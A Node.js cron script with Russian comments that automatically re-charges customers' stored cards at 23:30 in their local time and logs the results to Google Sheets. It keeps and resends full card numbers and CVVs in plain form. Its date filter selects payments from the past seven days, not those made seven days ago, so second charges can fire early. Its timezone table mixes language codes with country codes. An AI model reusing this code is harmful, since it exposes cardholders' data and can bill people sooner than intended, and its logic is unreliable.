const cron = require('node-cron');
const { PrismaClient } = require('@prisma/client');
const moment = require('moment-timezone');
const axios = require('axios');

const prisma = new PrismaClient();

// Функция для получения часового пояса по коду страны
function getTimezoneByCountry(countryCode) {
  const timezoneMap = {
    'US': 'America/New_York',
    'RU': 'Europe/Moscow',
    'UA': 'Europe/Kiev',
    'TR': 'Europe/Istanbul',
    'GB': 'Europe/London',
    'DE': 'Europe/Berlin',
    'FR': 'Europe/Paris',
    'IT': 'Europe/Rome',
    'ES': 'Europe/Madrid',
    'PL': 'Europe/Warsaw',
    'RO': 'Europe/Bucharest',
    'NL': 'Europe/Amsterdam',
    'PT': 'Europe/Lisbon',
    'SA': 'Asia/Riyadh',
    'ID': 'Asia/Jakarta',
    'TH': 'Asia/Bangkok',
    'VI': 'Asia/Ho_Chi_Minh',
    'JA': 'Asia/Tokyo',
    'KO': 'Asia/Seoul',
    'ZH': 'Asia/Shanghai',
    'HE': 'Asia/Jerusalem',
    'HI': 'Asia/Kolkata',
    'MX': 'America/Mexico_City'
  };
  
  return timezoneMap[countryCode] || 'UTC';
}

// Функция для создания новой подписки (повторный платеж)
async function createRecurringPayment(payment) {
  try {
    console.log(`🔄 Создаем повторный платеж для пользователя: ${payment.firstName} ${payment.lastName}`);
    
    // Данные для повторного платежа
    const recurringPaymentData = {
      firstName: payment.firstName,
      lastName: payment.lastName,
      email: payment.email,
      phone: payment.phone,
      countryCode: payment.countryCode,
      address: payment.address,
      postalCode: payment.postalCode,
      city: payment.city,
      cardHolder: payment.cardHolder,
      cardNumber: payment.cardNumber,
      expiry: payment.expiry,
      cvv: payment.cvv,
      plan: payment.plan,
      bid: payment.bid,
      userHash: payment.userHash,
      locale: payment.locale,
      subid: payment.subid,
      price: payment.price,
      isRecurring: true
    };
    
    // Отправляем запрос на создание повторной подписки
            const response = await axios.post('http://localhost:3011/pay', recurringPaymentData, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
    
    if (response.data.success) {
      console.log(`✅ Повторный платеж успешно создан для ${payment.firstName} ${payment.lastName}`);
      
      // Обновляем запись в БД
      await prisma.payment.update({
        where: { id: payment.id },
        data: {
          isSecondPayment: true,
          subscriptionReferenceCode: response.data.firstReferenceCode,
          nextRecurringDate: moment().add(7, 'days').toDate()
        }
      });
      
      // Логируем в Google Sheets
      const { addNewSubscriptionToSheet } = require('./lib/googleSheets');
      await addNewSubscriptionToSheet({
        bid: payment.bid || 'murkafix',
        firstName: payment.firstName,
        lastName: payment.lastName,
        plan: payment.plan,
        subscriptionId: response.data.firstReferenceCode,
        paymentType: 'recurring_payment',
        countryCode: payment.countryCode
      });
      
    } else {
      console.error(`❌ Ошибка создания повторного платежа: ${response.data.error}`);
      
      // Определяем тип ошибки и устанавливаем следующую попытку
      let nextAttemptDate;
      let errorType = 'unknown';
      
      if (response.data.error && response.data.error.includes('insufficient funds')) {
        // Недостаточно средств - пробуем через сутки
        nextAttemptDate = moment().add(1, 'day').toDate();
        errorType = 'insufficient_funds';
      } else if (response.data.error && response.data.error.includes('card declined')) {
        // Карта отклонена - прекращаем попытки
        nextAttemptDate = null;
        errorType = 'card_declined';
      } else {
        // Другие ошибки - прекращаем попытки
        nextAttemptDate = null;
        errorType = 'other_error';
      }
      
      // Обновляем запись в БД с информацией об ошибке
      await prisma.payment.update({
        where: { id: payment.id },
        data: {
          nextRecurringDate: nextAttemptDate,
          lastError: response.data.error,
          errorType: errorType
        }
      });
      
      // Логируем ошибку в Google Sheets
      const { addNewSubscriptionToSheet } = require('./lib/googleSheets');
      await addNewSubscriptionToSheet({
        bid: payment.bid || 'murkafix',
        firstName: payment.firstName,
        lastName: payment.lastName,
        plan: payment.plan,
        subscriptionId: `failed_${Date.now()}`,
        paymentType: 'recurring_payment', // Используем тот же тип для записи в ту же строку
        countryCode: payment.countryCode,
        error: response.data.error
      });
    }
    
  } catch (error) {
    console.error(`❌ Ошибка при создании повторного платежа:`, error.message);
  }
}

// Основная функция для обработки повторных платежей
async function processRecurringPayments() {
  try {
    console.log('🕐 Проверяем платежи для повторного снятия...');
    
    // Получаем все платежи, которые были созданы 7 дней назад
    const sevenDaysAgo = new Date();
    sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
    
    const payments = await prisma.payment.findMany({
      where: {
        createdAt: {
          gte: sevenDaysAgo
        },
        isSecondPayment: false, // Только те, которые еще не были повторно оплачены
        plan: {
          not: 'test' // Исключаем тестовые платежи
        }
      },
      orderBy: {
        createdAt: 'asc'
      }
    });
    
    console.log(`📊 Найдено ${payments.length} платежей для обработки`);
    
    for (const payment of payments) {
      try {
        // Получаем часовой пояс пользователя
        const userTimezone = getTimezoneByCountry(payment.countryCode);
        const userTime = moment().tz(userTimezone);
        
        // Проверяем, что сейчас 23:30 по времени пользователя
        if (userTime.hour() === 23 && userTime.minute() >= 30) {
          console.log(`⏰ Время для повторного платежа: ${userTime.format('YYYY-MM-DD HH:mm:ss')} (${userTimezone})`);
          await createRecurringPayment(payment);
        } else {
          console.log(`⏳ Не время для платежа: ${userTime.format('HH:mm')} (${userTimezone})`);
        }
        
      } catch (error) {
        console.error(`❌ Ошибка обработки платежа ${payment.id}:`, error.message);
      }
    }
    
  } catch (error) {
    console.error('❌ Ошибка в processRecurringPayments:', error.message);
  }
}

// Запускаем cron job каждую минуту для проверки платежей
function startPaymentScheduler() {
  console.log('🚀 Запускаем планировщик повторных платежей...');
  
  // Запускаем каждую минуту
  cron.schedule('* * * * *', async () => {
    await processRecurringPayments();
  });
  
  console.log('✅ Планировщик запущен. Проверка каждую минуту.');
}

// Функция для ручного запуска тестирования
async function testRecurringPayment() {
  console.log('🧪 Тестируем повторный платеж...');
  
  // Создаем тестовый платеж в БД
  const testPayment = await prisma.payment.create({
    data: {
      plan: 'solo',
      firstName: 'Test',
      lastName: 'Recurring',
      email: 'test@example.com',
      phone: '+12345678901',
      countryCode: 'US',
      address: '123 Test St',
      postalCode: '12345',
      city: 'Test City',
      cardHolder: 'Test User',
      cardNumber: '4111111111111111',
      expiry: '12/25',
      cvv: '123',
      bid: 'test_bid',
      userHash: 'test_recurring_hash',
      locale: 'en',
      isSecondPayment: false
    }
  });
  
  console.log('✅ Тестовый платеж создан:', testPayment.id);
  
  // Имитируем время 7 дней назад
  await prisma.payment.update({
    where: { id: testPayment.id },
    data: {
      createdAt: new Date(Date.now() - 7 * 24 * 60 * 60 * 1000)
    }
  });
  
  console.log('✅ Время платежа изменено на 7 дней назад');
  console.log('🔄 Запускаем обработку повторных платежей...');
  
  await processRecurringPayments();
}

// Экспортируем функции
module.exports = {
  startPaymentScheduler,
  processRecurringPayments,
  testRecurringPayment
};

// Если файл запущен напрямую
if (require.main === module) {
  // Запускаем планировщик
  startPaymentScheduler();
}
